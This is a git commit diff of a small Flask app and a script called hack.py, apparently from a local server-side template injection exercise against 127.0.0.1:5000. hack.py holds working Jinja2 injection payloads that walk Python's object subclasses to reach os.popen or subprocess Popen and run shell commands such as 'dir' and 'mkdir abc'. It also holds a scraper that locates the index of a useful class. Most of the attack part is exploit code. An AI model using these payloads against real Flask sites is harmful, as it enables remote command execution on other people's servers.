55cbbfc7e38303fdb89cabd9973d6eca82aabc98
Hubert <hubert.maka02@gmail.com>
2024-01-07 23:15:39 +0100

    final

--- app/app.py
+++ app/app.py
@@ -1,8 +1,5 @@
 from flask import Flask, render_template, render_template_string, request
 
-import subprocess
-
-
 app = Flask(__name__)
 
 @app.route('/')
@@ -21,26 +18,5 @@ def page_not_found(error):
 if __name__ == '__main__':
     app.run(debug=True)
 
-# counter = 0
-
-# for _ in range(10000):
-#     # Znalezienie wszystkich podklas klasy 'object'
-#     all_subclasses = ''.__class__.__mro__[1].__subclasses__()
-
-#     # Szukanie klasy subprocess.Popen wśród wszystkich podklas
-#     popen_class = None
-#     for subclass in all_subclasses:
-#         if subclass.__name__ == 'Popen' and 'subprocess' in str(subclass):
-#             popen_class = subclass
-#             break
-
-#     # Sprawdzenie, czy znaleziono klasę subprocess.Popen
-#     if popen_class:
-#         print("Znaleziono klasę subprocess.Popen:", popen_class)
-#         counter += 1
-#     else:
-#         print("Klasa subprocess.Popen nie została znaleziona.")
-
-# print(counter)
         
 
--- hack.py
+++ hack.py
@@ -1,27 +1,18 @@
 import requests
 from bs4 import BeautifulSoup
-import subprocess
 
+# http://127.0.0.1:5000/plektronika{{"foo".__class__.__base__.__subclasses__()[150].__init__.__globals__['sys'].modules['os'].popen('dir').read()}}
 
-# http://127.0.0.1:5000/plektronika{{''.__class__.__mro__[1].__subclasses__()[527]("echo 'hello'", shell=True)}}
-
-
-http://127.0.0.1:5000/plektronika{{"foo".__class__.__base__.__subclasses__()[150].__init__.__globals__['sys'].modules['os'].popen('dir').read()}}
-
-url = 'http://127.0.0.1:5000/plektronika{{"foo".__class__.__base__.__subclasses__()[150]}}'
+url = 'http://127.0.0.1:5000/plektronika{{"foo".__class__.__base__.__subclasses__()}}'
 
 
 response = requests.get(url)
 content = BeautifulSoup(response.text, 'html.parser')
 hack = content.find('h3').text.strip('[]').split('[', maxsplit=1)[1].split(',')
 
-print(hack)
-
 class_to_scrap = 'warnings.WarningMessage'
 
 for index, tag in enumerate(hack):
     if class_to_scrap in tag:
         print(tag, index)
-
-# print("foo".__class__.__base__.__subclasses__()[150].__init__.__globals__['sys'].modules['os'].popen('mkdir abc').read())
 
